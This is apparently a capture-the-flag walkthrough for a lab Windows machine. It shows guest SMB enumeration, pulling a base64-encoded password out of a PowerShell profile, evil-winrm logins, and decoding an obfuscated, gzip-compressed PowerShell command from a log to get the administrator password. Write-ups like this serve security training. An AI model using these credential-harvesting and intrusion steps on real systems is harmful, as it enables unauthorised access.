# Compromised

### Enumeration

```
$ smbmap -u Guest -H 192.168.192.152
        Scripts$                                                READ ONLY
        Users$                                                  READ ONLY
        
$ smbclient \\\\192.168.192.152\\Scripts$ -U Guest
$ smbclient \\\\192.168.192.152\\Users$ -U Guest
```

Users: administrator, scripting

```
smb: \scripting\Documents\WindowsPowerShell\> get profile.ps1
```

This file contains base64 encoded password.

```
$password = ConvertTo-SecureString "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('[REDACTEDBASE64ENCODED]')))" -AsPlainText -Force
```

### Initial Access

```
$ evil-winrm -u scripting -p [REDACTED] -i 192.168.192.152
```

### PrivEsc

There is log file. We can see the base64 encoded string.

`HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Enc JABPAHcAbgBlAGQAIAA9ACAAQAAoACkAOwAkAE8AdwBuAGUAZAAgACsAPQAgAHsAJABEAGUAYwBvAGQAZQBkACAAPQAgAFsAUwB5AHMAdABlAG0ALgBDAG8AbgB2A...`

We should decode this long part.&#x20;

They obfuscated it. We have to solve it.

We eliminated unnecessary parts of it. We broke down the script to:

```
$Decoded = [System.Convert]::FromBase64String("[REDACTEDBASE64ENCODED]")
$ms = (New-Object System.IO.MemoryStream($Decoded,0,$Decoded.Length))
(New-Object System.IO.StreamReader(New-Object System.IO.Compression.GZipStream($ms, [System.IO.Compression.CompressionMode]::Decompress))).readtoend()
```

Execute these commands respectively. It will give the password.

```
$ evil-winrm -u Administrator -p [REDACTED] -i 192.168.192.152
```
